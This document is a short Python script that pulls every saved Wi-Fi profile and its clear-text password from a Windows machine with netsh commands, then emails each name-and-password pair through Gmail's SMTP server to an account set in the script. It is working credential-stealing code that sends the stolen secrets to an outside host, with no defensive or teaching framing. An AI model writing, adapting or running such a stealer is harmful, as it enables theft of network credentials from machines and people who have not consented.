#!/usr/bin/python3
import subprocess
import smtplib

login = "enter your login here"
password = "enter your password here"

smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
smtpObj.starttls()
smtpObj.login(login, password)

data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode("cp866").split('\n')
wifis = [line.split(':')[1][1:-1] for line in data if "All User Profile" in line]

for wifi in wifis:
	results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear']).decode('cp866').split('\n')
	results = [line.split(':')[1][1:-1] for line in results if "Key Content" in line]
	psk = (f'name {wifi}, Password {results[0]}')
	smtpObj.sendmail(login,login,psk)
